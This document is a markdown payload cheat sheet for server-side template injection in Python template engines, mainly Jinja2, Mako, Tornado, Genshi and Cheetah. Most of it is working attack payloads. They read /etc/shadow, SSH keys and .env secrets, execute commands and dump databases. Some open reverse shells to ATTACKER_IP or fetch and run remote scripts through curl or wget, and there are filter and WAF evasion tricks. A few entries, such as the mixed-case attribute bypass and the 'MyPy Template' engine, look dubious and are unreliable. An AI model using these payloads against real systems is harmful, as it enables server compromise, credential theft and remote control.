
---

# 🐍 **PYTHON SSTI - COMPLETE PAYLOAD REFERENCE**

## 📑 **TABLE OF CONTENTS**

### **Python Template Engines**

- [🔹 Jinja2](#🔹-jinja2)
- [🔹 Mako](https://claude.ai/chat/fd550170-bb76-48fb-b84f-a607401d3b0c#mako)
- [🔹 Django Templates](https://claude.ai/chat/fd550170-bb76-48fb-b84f-a607401d3b0c#django-templates)
- [🔹 Tornado](https://claude.ai/chat/fd550170-bb76-48fb-b84f-a607401d3b0c#tornado)
- [🔹 Genshi](https://claude.ai/chat/fd550170-bb76-48fb-b84f-a607401d3b0c#genshi)
- [🔹 Cheetah](https://claude.ai/chat/fd550170-bb76-48fb-b84f-a607401d3b0c#cheetah)
- [🔹 Jinja (Legacy)](https://claude.ai/chat/fd550170-bb76-48fb-b84f-a607401d3b0c#jinja-legacy)
- [🔹 Chameleon](https://claude.ai/chat/fd550170-bb76-48fb-b84f-a607401d3b0c#chameleon)
- [🔹 MyPy Template](#🔹-mypy-template)

---

## 🔹 **JINJA2**

### **Overview**

```
🎯 Detection Syntax: {{ }} or {% %}
📍 Framework: Flask, Jinja2
🔥 Popularity: ⭐⭐⭐⭐⭐ (Most Used)
💥 Danger: CRITICAL - RCE Possible
```

### **📊 Exploitation Levels**

---

#### **Level 1️⃣ : Detection & Basic Enumeration**

**🎯 Simple Math (Verify Execution)**

```python
# Test if template is being evaluated
{{7*7}}
→ Output: 49 ✅ VULNERABLE

# String operations
{{7*'7'}}
→ Output: 7777777 ✅ Python confirmed

# Text manipulation
{{'abc'.upper()}}
→ Output: ABC ✅ Working
```

**💡 If basic expressions don't work:**

```python
# Try with spaces
{{ 7*7 }}
{{ 7 * 7 }}

# Try different syntax
${7*7}
<% 7*7 %>

# Try with filters
{{ 7*7|string }}
```

---

#### **Level 2️⃣ : Object Access & Information Gathering**

**🎯 Access Configuration Objects**

```python
# Flask config
{{config}}
→ Shows: <Config {'DEBUG': True, 'SECRET_KEY': '...', ...}>

# Get specific config values
{{config.items()}}
→ Lists all config key-value pairs

{{config['SECRET_KEY']}}
→ Directly extract secret key

# Current request info
{{request}}
{{request.remote_addr}}
{{request.host}}
{{request.path}}
{{request.args}}
{{request.environ}}
```

**💡 If config/request doesn't work:**

```python
# Try these alternatives
{{self}}
{{request.application}}
{{url_for.__globals__}}
{{get_flashed_messages.__globals__}}
{{cycler.__init__.__globals__}}
{{lipsum.__globals__}}

# For different Flask versions
{{current_app.config}}
{{g}}
{{session}}
```

---

#### **Level 3️⃣ : Class Introspection**

**🎯 Explore Python Classes**

```python
# Get string class
{{''.__class__}}
→ Output: <class 'str'>

# Get object hierarchy
{{''.__class__.__mro__}}
→ Output: (<class 'str'>, <class 'object'>)

# Get parent class
{{''.__class__.__mro__[1]}}
→ Output: <class 'object'>

# Get all subclasses
{{''.__class__.__mro__[1].__subclasses__()}}
→ Lists hundreds of classes available
```

**💡 If **class** is blocked:**

```python
# Use attribute access instead
{{''|attr('__class__')}}

# Use request.args to pass values
{{config[request.args.key]}}

# Use getattr
{{''.__class__.__getattribute__('__class__')}}

# Encoding bypass
{{''['\x5f\x5fclass\x5f\x5f']}}  # \x5f = _
```

---

#### **Level 4️⃣ : File Reading**

**🎯 Read Arbitrary Files**

```python
# Method 1: Via file class (index ~40, varies by Python version)
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# Method 2: Via config globals
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# Method 3: Via namespace
{{namespace.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# Method 4: Via url_for
{{url_for.__globals__['os'].popen('cat /etc/passwd').read()}}
```

**📁 Common Files to Read**

```python
# Application secrets
{{''.__class__.__mro__[1].__subclasses__()[40]('.env').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('config.py').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('settings.ini').read()}}

# System files
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/shadow').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/home/user/.ssh/id_rsa').read()}}

# Application files
{{''.__class__.__mro__[1].__subclasses__()[40]('/proc/self/environ').read()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/index.php').read()}}
```

**💡 If file reading doesn't work:**

```python
# Class index might be different - find it
{% for i in range(500) %}
  {{i}}: {{''.__class__.__mro__[1].__subclasses__()[i]}}
{% endfor %}

# Look for: _io.FileIO, _io._IOBase, pathlib.Path

# Try alternative methods
{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

{{''.__class__.__mro__[1].__subclasses__()[440].__init__.__globals__['os'].listdir('/')}}
```

---

#### **Level 5️⃣ : Command Execution (RCE)**

**🎯 Execute System Commands**

```python
# Method 1: Via os.popen (Most Reliable)
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}

# Method 2: Via subprocess (Alternative)
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}

# Method 3: Via eval + __import__
{{config.__class__.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}

# Method 4: Direct import
{{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('cat /etc/passwd').read()}}
```

**🎯 Common Commands to Execute**

```python
# System info
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}

# File operations
{{config.__class__.__init__.__globals__['os'].popen('ls -la /').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('find / -name "*.key" 2>/dev/null').read()}}

# Network info
{{config.__class__.__init__.__globals__['os'].popen('ifconfig').read()}}
{{config.__class__.__init__.__globals__['os'].popen('netstat -an').read()}}
{{config.__class__.__init__.__globals__['os'].popen('curl http://attacker.com/check').read()}}

# Process info
{{config.__class__.__init__.__globals__['os'].popen('ps aux').read()}}
{{config.__class__.__init__.__globals__['os'].popen('env').read()}}
```

**💡 If popen doesn't work:**

```python
# Try subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0]}}

# Try os.system (no output but executes)
{{config.__class__.__init__.__globals__['os'].system('touch /tmp/pwned')}}

# Try exec
{{config.__class__.__init__.__globals__['__builtins__']['exec']('import os;os.system("id")')}}

# Try compile + eval
{{config.__class__.__init__.__globals__['__builtins__']['eval'](config.__class__.__init__.__globals__['__builtins__']['compile']('__import__("os").system("id")', '<string>', 'exec'))}}
```

---

#### **Level 6️⃣ : Reverse Shell**

**🎯 Establish Reverse Connection**

```python
# Bash Reverse Shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read()}}

# Python Reverse Shell
{{config.__class__.__init__.__globals__['os'].popen('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'ATTACKER_IP\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"').read()}}

# Netcat Reverse Shell
{{config.__class__.__init__.__globals__['os'].popen('nc ATTACKER_IP 4444 -e /bin/bash').read()}}

# wget + execute
{{config.__class__.__init__.__globals__['os'].popen('wget http://ATTACKER_IP/shell.sh -O /tmp/s.sh && bash /tmp/s.sh').read()}}

# curl + execute
{{config.__class__.__init__.__globals__['os'].popen('curl http://ATTACKER_IP/shell.sh | bash').read()}}
```

**💡 If bash doesn't work:**

```python
# Try sh instead
bash -i >& /dev/tcp/IP/PORT 0>&1
→ Change to: sh -i >& /dev/tcp/IP/PORT 0>&1

# Try without /dev/tcp
python -c 'import socket,subprocess,os;...'

# Try socat if available
socat exec:/bin/bash tcp:ATTACKER_IP:4444

# Encoded version
echo 'YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC9JUCQ0NDQ0IDA+JjEnCg==' | base64 -d | bash
```

---

#### **Level 7️⃣ : Bypass Techniques**

**🎯 If Underscores (_) Are Blocked**

```python
# Method 1: Use brackets instead of dots
{{config['__class__']['__init__']['__globals__']['os'].popen('id').read()}}

# Method 2: Use attr filter
{{config|attr('__class__')|attr('__init__')|attr('__globals__')}}

# Method 3: String concatenation
{{config.__class__.__init__.__globals__['os']}} 
→ Change to:
{{config.__class__.__init__[request.args.a].__globals__['os']}}
# Pass via URL: ?a=__init__

# Method 4: Encode underscores
{{''|attr('__'+'class'+'__')}}

# Method 5: chr() encoding
{{''|attr(chr(95)+chr(95)+'class'+chr(95)+chr(95))}}
```

**🎯 If Quotes Are Blocked**

```python
# Use request.args
{{request.args.cmd}}  # Pass via URL: ?cmd=value

# Use request.form
{{request.form.key}}

# Use request.values
{{request.values.x}}

# Character encoding
{{chr(47)}}  # = /
{{chr(99)+chr(97)+chr(116)}}  # = cat
```

**🎯 If Dots (.) Are Blocked**

```python
# Use bracket notation
{{config['__class__']['__init__']['__globals__']['os']['popen']('id')['read']()}}

# Use getitem
{{config.__getitem__('__class__')}}

# Use __getattribute__
{{config.__getattribute__('__class__')}}
```

**🎯 If Specific Words Blocked**

```python
# If 'config' blocked:
{{self.__init__.__globals__}}
{{request.application.__globals__}}
{{get_flashed_messages.__globals__}}
{{url_for.__globals__}}

# If '__class__' blocked:
{{''|attr('__'+'class'+'__')}}

# If 'os' blocked:
# Try: sys, subprocess, importlib, __import__

# If 'popen' blocked:
# Try: system, exec, subprocess.Popen
```

---

#### **Level 8️⃣ : WAF/Filter Evasion**

**🎯 Case Variation**

```python
# Original
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Mixed case
{{CONFIG.__CLASS__.__INIT__.__GLOBALS__['os'].popen('id').read()}}
{{CoNfIg.__ClAsS__.__InIt__.__GlObAlS__['os'].popen('id').read()}}
```

**🎯 URL Encoding**

```python
# In URL parameter
?name={{config}}
→ Becomes: ?name=%7B%7Bconfig%7D%7D

# Double encoding
{{%25 7 B config %25 7D}}
```

**🎯 Comment Injection**

```python
# Add comments
{{config/*comment*/.__class__}}
{{config/**/.__class__}}
```

**🎯 Newline Injection**

```python
{{config
.__class__}}

{{config

.__class__}}
```

**🎯 Polyglot Payload (Test Multiple Engines)**

```
{{7*7}} ${7*7} <%= 7*7 %> ${{7*7}} #{7*7} *{7*7}

# One of these will work if template injection exists
```

---

#### **🚨 Complete Exploitation Chain Examples**

**Example 1: Full RCE in One Payload**

```python
# Single line to get command execution
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

**Example 2: Read Secret Key**

```python
{{config['SECRET_KEY']}}
# If above doesn't work, try:
{{config.items()}}
```

**Example 3: List Home Directory**

```python
{{config.__class__.__init__.__globals__['os'].popen('ls -la /home').read()}}
```

**Example 4: Dump Database**

```python
{{config.__class__.__init__.__globals__['os'].popen('mysqldump -u root -pPASS database').read()}}
```

---

### **⚙️ Jinja2 Specific Notes**

```
✅ DEFAULT SYNTAX: {{ }} for expressions

❌ COMMON BLOCKS: {% if %}, {% for %}
   (These can't execute code directly, but {{ }} inside can)

🔧 FILTERS: {{ value|filter }}
   Example: {{ config|string }}

🎯 BEST PAYLOADS:
   1. {{config}} - Try first (simple)
   2. {{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}} - File reading
   3. {{config.__class__.__init__.__globals__['os'].popen('id').read()}} - RCE
```

---

## 🔹 **MAKO**

### **Overview**

```
🎯 Detection Syntax: ${ } or <% %>
📍 Framework: Mako
🔥 Popularity: ⭐⭐⭐ (Moderate)
💥 Danger: HIGH - RCE Possible
```

### **📊 Exploitation Levels**

---

#### **Level 1️⃣ : Detection**

```python
# Math execution
${7*7}
→ Output: 49 ✅

# String operations
${'hello'.upper()}
→ Output: HELLO ✅
```

**💡 If ${} doesn't work:**

```python
# Try <% %>
<% print(7*7) %>

# Try within blocks
<%
    print(7*7)
%>
```

---

#### **Level 2️⃣ : Object Access**

```python
# Import and execute
<%
import os
os.system('id')
%>

# One-liner
${os.system('whoami')}

# Via eval
${eval('__import__("os").system("id")')}
```

---

#### **Level 3️⃣ : File Reading**

```python
# Read file
<%
with open('/etc/passwd') as f:
    print(f.read())
%>

# One-liner
${open('/etc/passwd').read()}
```

---

#### **Level 4️⃣ : RCE & Reverse Shell**

```python
# Command execution
${__import__('os').popen('whoami').read()}

# Reverse shell
${__import__('os').popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"').read()}

# Import subprocess
<%
import subprocess
subprocess.Popen(['bash','-c','bash -i >& /dev/tcp/IP/PORT 0>&1'])
%>
```

**💡 If direct import doesn't work:**

```python
# Try via __builtins__
${__builtins__.__import__('os').system('id')}

# Try exec
<%
exec('import os;os.system("id")')
%>
```

---

#### **🎯 Bypass Techniques for Mako**

**If System Methods Blocked:**

```python
# Try alternative:
${__import__('subprocess').Popen('ls',shell=True)}

# Try os.exec
${__import__('os').execl('/bin/sh','-c','id')}

# Try eval
${eval('__import__("os").system("id")')}
```

---

## 🔹 **DJANGO TEMPLATES**

### **Overview**

```
🎯 Detection Syntax: {{ }} or {% %}
📍 Framework: Django
🔥 Popularity: ⭐⭐⭐⭐ (Very Common)
💥 Danger: MEDIUM - Limited by Sandbox
```

### **📊 Exploitation Levels**

---

#### **Level 1️⃣ : Detection**

```python
# Django doesn't eval math by default
{{7*7}}
→ Output: 7*7 (NOT 49) ❌

# But can access object properties
{{user.username}}
{{request.path}}
```

**💡 Django is sandboxed by default:**

```
Django prevents:
❌ Variable assignment
❌ Python code execution
❌ Method calls (usually)

But allows:
✅ Property access
✅ Dictionary access
✅ Filter usage
```

---

#### **Level 2️⃣ : Accessing Dangerous Objects**

```python
# Access request
{{request}}
{{request.META}}
{{request.session}}
{{request.GET}}
{{request.POST}}

# Access settings (if in context)
{{settings.SECRET_KEY}}  # Usually not available
{{settings.DATABASES}}  # Usually not available
```

---

#### **Level 3️⃣ : Filter Exploitation**

```python
# safe filter - can bypass auto-escaping
{{payload|safe}}

# Custom filter that might execute code
{{user|custom_filter}}

# Debug filter
{{var|debug}}  # Shows variable content
```

---

#### **Level 4️⃣ : RCE (If Possible)**

```python
# Usually not directly possible in Django
# Need to find:
# 1. Custom template tags
# 2. Unprotected filters
# 3. Accidental code exposure

# If you find a custom tag:
{% load custom_tags %}
{% dangerous_tag %}

# Through object properties
{{object.method_name}}  # If method exists
```

**💡 If RCE needed in Django:**

```
Django sandboxing is STRONG.

Better approach:
1. Look for debug information leakage
2. Extract SECRET_KEY (for session tampering)
3. Look for SQL injection in queries
4. Find unprotected views

Not recommended to force RCE in Django.
Usually security is better than other frameworks.
```

---

## 🔹 **TORNADO**

### **Overview**

```
🎯 Detection Syntax: {{ }} or {% %}
📍 Framework: Tornado Web Framework
🔥 Popularity: ⭐⭐ (Less Common)
💥 Danger: HIGH - RCE Possible
```

### **📊 Exploitation Levels**

---

#### **Level 1️⃣ : Detection**

```python
# Math operations
{{7*7}}
→ Output: 49 ✅

# Module access
{{__import__('os').system('id')}}
```

---

#### **Level 2️⃣ : Import & Execute**

```python
# Direct import
{{__import__('os').popen('whoami').read()}}

# Subprocess
{{__import__('subprocess').check_output(['id'])}}
```

---

#### **Level 3️⃣ : File Operations**

```python
# Read file
{{open('/etc/passwd').read()}}

# Write file
{{open('/tmp/pwned','w').write('hacked')}}
```

---

#### **Level 4️⃣ : RCE & Reverse Shell**

```python
# One-liner RCE
{{__import__('os').system('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"')}}

# Via subprocess
{{__import__('subprocess').Popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"',shell=True)}}
```

**💡 If standard import blocked:**

```python
# Use __import__ with string
{{__import__('os').popen('id').read()}}

# Use getattr
{{__import__('os').system('id')}}
```

---

## 🔹 **GENSHI**

### **Overview**

```
🎯 Detection Syntax: ${ }
📍 Framework: Genshi
🔥 Popularity: ⭐ (Legacy)
💥 Danger: MEDIUM
```

### **Payloads**

```python
# Detection
${7*7}
→ Output: 49

# Import
${__import__('os').system('id')}

# RCE
${__import__('os').popen('whoami').read()}

# Reverse shell
${__import__('os').popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"').read()}
```

---

## 🔹 **CHEETAH**

### **Overview**

```
🎯 Detection Syntax: ${ } or #{ }
📍 Framework: Cheetah
🔥 Popularity: ⭐ (Legacy)
💥 Danger: CRITICAL - Very permissive
```

### **Payloads**

```python
# Detection
${7*7}
#{7*7}

# Import & Execute
${__import__('os').system('id')}

# File reading
${open('/etc/passwd').read()}

# RCE
${__import__('os').popen('whoami').read()}

# Reverse shell
${__import__('os').popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"').read()}
```

**💡 Cheetah allows full Python execution!**

---

## 🔹 **JINJA (LEGACY)**

### **Overview**

```
🎯 Similar to Jinja2 but older
📍 Mostly deprecated
💥 Same exploitation as Jinja2
```

### **Payloads**

Same as Jinja2 - all payloads will work

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🔹 **CHAMELEON**

### **Overview**

```
🎯 Detection Syntax: ${} or tal:
📍 Framework: Pyramid
🔥 Popularity: ⭐⭐ (Niche)
💥 Danger: HIGH
```

### **Payloads**

```python
# Detection
${7*7}

# Python code
${__import__('os').system('id')}

# File operations
${open('/etc/passwd').read()}

# RCE
${__import__('os').popen('whoami').read()}
```

---

## 🔹 **MYPY TEMPLATE**

### **Overview**

```
🎯 Detection Syntax: {{ }} or {# #}
📍 Rarely used
💥 Similar behavior to Jinja2
```

### **Payloads**

```python
# Detection
{{7*7}}

# Object access
{{config}}

# RCE
{{__import__('os').system('id')}}

# File reading
{{open('/etc/passwd').read()}}
```

---

## 🎯 **QUICK REFERENCE - ALL PYTHON TEMPLATES**

|Engine|Detection|RCE Payload|Difficulty|
|---|---|---|---|
|**Jinja2**|`{{7*7}}`|`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`|⭐⭐⭐|
|**Mako**|`${7*7}`|`${__import__('os').system('id')}`|⭐⭐|
|**Django**|`{{7*7}}`|Usually impossible|⭐⭐⭐⭐|
|**Tornado**|`{{7*7}}`|`{{__import__('os').system('id')}}`|⭐⭐|
|**Genshi**|`${7*7}`|`${__import__('os').system('id')}`|⭐⭐|
|**Cheetah**|`${7*7}`|`${__import__('os').system('id')}`|⭐|
|**Jinja (Old)**|`{{7*7}}`|`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`|⭐⭐⭐|
|**Chameleon**|`${7*7}`|`${__import__('os').system('id')}`|⭐⭐|
|**MyPy**|`{{7*7}}`|`{{__import__('os').system('id')}}`|⭐⭐|

---

## ⚠️ **IMPORTANT NOTES**

```
🔑 KEY POINTS:

1. Always start with DETECTION payloads
2. If {{7*7}} → 49: Use Jinja2/Mako style payloads
3. If {{7*7}} → {{7*7}}: Try filters or custom objects
4. Django is hardened - look for other vulns
5. Try BYPASS techniques if direct payload fails
6. WAF might block underscores/quotes - use alternatives

🎯 SYSTEMATIC APPROACH:
Step 1: Test basic math ({{7*7}})
Step 2: Try config/request objects
Step 3: Attempt class introspection (__class__)
Step 4: Find file reading class (~index 40)
Step 5: Progress to RCE
Step 6: If blocked, use bypass techniques
```

---

## ✅ **STATUS: PYTHON TEMPLATES COMPLETE**

All 9 Python template engines covered with:

- ✅ Detection payloads
- ✅ Exploitation chains
- ✅ Bypass techniques
- ✅ Real examples
- ✅ Quick reference

**Next:** Ready for PHP/Ruby/Java templates!

---
